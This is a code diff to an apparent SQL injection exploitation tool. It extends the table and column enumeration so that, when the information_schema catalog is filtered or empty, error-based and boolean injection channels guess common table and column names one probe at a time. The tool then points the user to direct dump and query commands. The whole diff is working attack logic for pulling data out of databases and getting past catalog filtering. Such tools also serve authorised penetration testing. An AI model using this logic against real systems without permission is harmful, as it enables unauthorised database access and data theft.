@@ -476,27 +476,31 @@ def _walk_tables(oracle, prof, union):
 
 
 def _tables(c, oracle, prof, union):
-    """Tables via the catalog; if that's blocked/empty on a blind walk, fall back
-    to guessing common names (no information_schema needed)."""
+    """Tables via the catalog; if that's blocked/empty, fall back to guessing common
+    names (no information_schema needed) — by name through the error channel or a
+    boolean ask(), whichever oracle this is."""
     tbls = list(_walk_tables(oracle, prof, union))
-    if tbls or isinstance(oracle, sqli.ErrorOracle):
-        return tbls          # the error channel has no boolean ask() for by-name guessing
-    blocked = getattr(oracle, "blocked", 0)
-    if blocked:
-        c.warn(f"the catalog (information_schema) looks filtered — {blocked} anomalous "
+    if tbls:
+        return tbls
+    is_err = isinstance(oracle, sqli.ErrorOracle)
+    if getattr(oracle, "blocked", 0):
+        c.warn(f"the catalog (information_schema) looks filtered — {oracle.blocked} anomalous "
                "response(s); falling back to common table names")
+    elif is_err:
+        c.warn("the error channel returned no catalog (information_schema may be absent "
+               "or filtered here) — guessing common table names instead (a probe per name)")
     else:
         c.info("catalog returned nothing — trying common table names")
-    db = None
-    try:                                    # the db name lets us also try <db>_<name>
-        db = (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip() or None
-    except Exception:
-        pass
+    db = _current_db(oracle, prof, union)   # the db name lets us also try <db>_<name>
     if db:
         c.info(f"guessing names against the '{db}' database (and <db>_* conventions)")
-    tbls = list(sqli.common_tables(oracle, db=db))
+    tbls = list(sqli.error_common_tables(oracle, db=db) if is_err
+                else sqli.common_tables(oracle, db=db))
     if tbls:
         c.good(f"{len(tbls)} table(s) found by name (information_schema bypassed)")
+    elif is_err:
+        c.warn("no common table names matched through the error channel — if you know a "
+               'table, read it directly: `dump <table>` or `query "(SELECT <col> FROM <table>)"`')
     else:
         c.warn("no common table names matched — try `query` with a name you expect")
     return tbls
@@ -512,13 +516,21 @@ def _walk_columns(oracle, prof, union, table):
 
 def _columns(c, oracle, prof, union, table):
     cols = list(_walk_columns(oracle, prof, union, table))
-    if cols or isinstance(oracle, sqli.ErrorOracle):
+    if cols:
         return cols
+    is_err = isinstance(oracle, sqli.ErrorOracle)
     if getattr(oracle, "blocked", 0):
         c.warn(f"columns of {table} via information_schema look filtered — guessing common names")
-    cols = list(sqli.common_columns(oracle, table))
+    elif is_err:
+        c.warn(f"the error channel returned no columns for {table} — guessing common "
+               "column names (a probe per name)")
+    cols = list(sqli.error_common_columns(oracle, table) if is_err
+                else sqli.common_columns(oracle, table))
     if cols:
         c.good(f"{len(cols)} column(s) found by name")
+    elif is_err:
+        c.warn(f"couldn't identify any columns of {table} by name — if you know one, read "
+               f'it directly: `query "(SELECT <col> FROM {table})"`')
     return cols
 
 
@@ -559,6 +571,8 @@ def _tables_in(c, oracle, prof, union, db):
         return _tables(c, oracle, prof, union)
     if isinstance(oracle, sqli.ErrorOracle):
         tbls = [t for t in sqli.error_tables(oracle, db=db) if t]
+        if not tbls:                                            # catalog empty — guess by name
+            tbls = list(sqli.error_common_tables(oracle, db=db))
     elif union:
         tbls = [t for t in sqli.union_tables(oracle.http, oracle, *union, db=db) if t]
     else:
@@ -572,7 +586,8 @@ def _columns_in(c, oracle, prof, union, table, db):
     if db is None:
         return _columns(c, oracle, prof, union, table)
     if isinstance(oracle, sqli.ErrorOracle):
-        return [x for x in sqli.error_columns(oracle, table, db=db) if x]
+        cols = [x for x in sqli.error_columns(oracle, table, db=db) if x]
+        return cols or list(sqli.error_common_columns(oracle, table, db=db))
     if union:
         return [x for x in sqli.union_columns(oracle.http, oracle, *union, table, db=db) if x]
     return [x for x in sqli.columns(oracle, prof, table) if x]   # prof already scoped
